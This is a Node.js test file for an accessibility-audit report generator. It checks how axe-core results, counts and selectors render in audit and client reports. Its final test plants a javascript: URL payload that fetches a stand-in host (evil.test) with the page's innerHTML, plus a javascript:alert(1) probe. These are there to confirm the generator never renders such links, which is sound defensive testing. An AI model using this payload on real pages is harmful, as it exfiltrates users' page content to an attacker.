import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const GENERATOR = resolve(ROOT, 'core/scripts/generate-report.mjs');

function fixture({ includeAxe = true } = {}) {
  const audit = {
    metadata: {
      date: '2026-07-30',
      scope: 'axe report test',
      url: 'https://example.com/',
      standard: 'WCAG 2.2 AA',
      audit_tier: 'Tier 1 + Tier 2',
      requires_live_audit: false,
    },
    summary: {
      overall_score: 72,
      coverage_percent: 44,
      total_findings: 2,
      critical: 1,
      warnings: 1,
      tips: 0,
      categories: [
        { id: 'contrast', name: 'Color & Contrast', pass: 2, fail: 1, review: 0, state: 'scored', score: 55 },
        { id: 'screenreader', name: 'Screen Reader', pass: 3, fail: 1, review: 0, state: 'scored', score: 63 },
      ],
    },
    findings: [
      {
        key: 'html-lang-missing',
        category: 'screenreader',
        severity: 'critical',
        check: 'fail',
        wcag: 'WCAG 2.2: 3.1.1',
        title: 'Page language is missing',
        affected_users: 'Screen-reader users',
        location: 'index.html:1',
        fix: 'Add lang.',
      },
      {
        id: 'axe-color-contrast',
        key: 'color-contrast',
        axe_rule_id: 'color-contrast',
        category: 'contrast',
        severity: 'warning',
        check: 'fail',
        score_effect: 'corroborating',
        source: 'axe-core@4.11.4',
        evidence_sources: ['axe-core@4.11.4', 'beacon-tier2-audit@2'],
        wcag: 'WCAG 2.2: 1.4.3 Contrast (Minimum)',
        title: 'Corroborating contrast evidence',
        affected_users: 'Low-vision users',
        fix: 'Increase contrast.',
        axe_node_count: 2,
        instances: [
          { selector: '#first', html: '<a id="first">First</a>', reason: 'Contrast is 3:1' },
          { selector: '#second', html: '<a id="second">Second</a>', reason: 'Contrast is 4:1' },
        ],
      },
    ],
    legal_risk: {},
    testing_recommendations: [],
  };
  if (includeAxe) {
    audit.axe = {
      engine: 'axe-core',
      version: '4.11.4',
      source: 'axe-core@4.11.4',
      url: 'https://example.com/',
      timestamp: '2026-07-30T05:52:30.116Z',
      counts: { violations: 1, violation_nodes: 2, passes: 1, incomplete: 1, inapplicable: 1 },
      violations: [{
        id: 'color-contrast',
        tags: ['wcag2aa', 'wcag143'],
        help: 'Elements must meet contrast thresholds',
        nodes: [
          { target: ['#first'], html: '<a id="first">First</a>' },
          { target: ['#second'], html: '<a id="second">Second</a>' },
        ],
      }],
      passes: [{ id: 'document-title', help: 'Documents must have title' }],
      incomplete: [{ id: 'aria-prohibited-attr', help: 'ARIA attributes need review' }],
      inapplicable: [{ id: 'video-caption', help: 'Videos must have captions' }],
    };
  }
  return audit;
}

function render(audit, audience = 'audit') {
  const dir = mkdtempSync(join(tmpdir(), 'beacon-axe-report-'));
  try {
    const input = join(dir, 'audit.json');
    const output = join(dir, 'report.html');
    writeFileSync(input, JSON.stringify(audit));
    execFileSync('node', [GENERATOR, input, '--audience', audience, '--output', output]);
    return readFileSync(output, 'utf8');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test('audit shows axe engine, complete outcome counts, provenance, and every affected selector', () => {
  const html = render(fixture());

  assert.match(html, /axe-core@4\.11\.4/);
  assert.match(html, /1 violation rule/);
  assert.match(html, /2 affected DOM node/);
  assert.match(html, /document-title/);
  assert.match(html, /aria-prohibited-attr/);
  assert.match(html, /video-caption/);
  assert.match(html, /#first/);
  assert.match(html, /#second/);
  assert.match(html, /beacon-tier2-audit@2/);
});

test('audit explicitly discloses when axe-core was not included even after Tier 2', () => {
  const html = render(fixture({ includeAxe: false }));

  assert.match(html, /axe-core was not included in this audit/i);
});

test('client excludes raw axe evidence and corroborating findings from confirmed counts and priorities', () => {
  const html = render(fixture(), 'client');

  assert.match(html, /1 critical and 0 warning finding/);
  assert.doesNotMatch(html, /Corroborating contrast evidence/);
  assert.doesNotMatch(html, /<details class="axe-outcome-list">/);
  assert.doesNotMatch(html, /aria-prohibited-attr/);
});

// Bug 4 (HIGH): a legacy artifact carrying only axe.violations (no passes/incomplete/
// inapplicable arrays) must still render its findings, not the false "not included" notice.
test('legacy artifact with only axe.violations still renders its findings, not "not included"', () => {
  const audit = {
    metadata: { date: '2026-07-30', scope: 'legacy axe test', standard: 'WCAG 2.2 AA', audit_tier: 'Tier 1 + axe-core' },
    summary: { overall_score: 80, coverage_percent: 40, total_findings: 0, critical: 0, warnings: 0, tips: 0, categories: [] },
    findings: [],
    legal_risk: {},
    testing_recommendations: [],
    axe: {
      violations: [{
        id: 'color-contrast', tags: ['wcag2aa', 'wcag143'],
        help: 'Elements must meet contrast thresholds',
        nodes: [{ target: ['#legacy'], html: '<p id="legacy">x</p>' }],
      }],
    },
  };
  const html = render(audit);

  assert.doesNotMatch(html, /axe-core was not included in this audit/i);
  assert.match(html, /Elements must meet contrast thresholds/);
});

// Bug 7 (MEDIUM): a tampered axe JSON's helpUrl must never render as a clickable link
// unless it is http/https — a javascript: scheme would execute on click.
test('a tampered javascript: helpUrl never renders as a clickable link', () => {
  const audit = fixture();
  audit.findings[1].helpUrl = "javascript:fetch('https://evil.test/'+document.body.innerHTML)";
  audit.axe.incomplete[0].helpUrl = 'javascript:alert(1)';
  const html = render(audit);

  assert.doesNotMatch(html, /href="javascript:/i);
});
